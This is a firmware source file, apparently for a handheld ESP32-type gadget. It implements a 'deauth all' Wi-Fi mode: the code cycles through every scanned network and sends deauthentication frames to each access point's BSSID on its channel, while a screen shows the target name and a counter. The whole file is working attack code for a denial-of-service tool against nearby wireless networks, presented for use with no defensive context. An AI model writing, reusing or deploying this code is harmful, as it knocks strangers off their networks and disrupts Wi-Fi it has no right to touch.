// pid PID::WIFI_DEAUTH_ALL

// Reuses the deauth frame helpers defined in wifiDeauthLoop.h

static int _daIndex = 0;

void wifiDeauthAllLoop() {
	if (isSetup()) {
		if (wifiCount == 0) {
			centeredPrint(L->TXT_WIFI_NO_NETWORKS, MEDIUM_TEXT);
			return;
		}
		WiFi.mode(WIFI_AP);
		WiFi.softAP("deauth_all", "", 1, 1, 4, false);
		memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
		_daIndex = 0;
	}

	checkExit();
	if (wifiCount == 0) {
		return;
	}

	String targetSsid = WiFi.SSID(_daIndex);
	uint8_t* targetBssid = WiFi.BSSID(_daIndex);
	int targetChannel = WiFi.channel(_daIndex);

	char counter[16];
	snprintf(counter, sizeof(counter), "%d/%d", _daIndex + 1, wifiCount);
	String lines[] = {
		String(counter),
		targetSsid.substring(0, 18),
		"Deauthing all..."
	};
	centeredPrintRows(lines, 3, MEDIUM_TEXT, true);
	drawSpinner();
	canvas.pushSprite(0, getStatusBarHeight());

	wsl_bypasser_send_deauth_frame(targetBssid, targetChannel);

	_daIndex = (_daIndex + 1) % wifiCount;
}
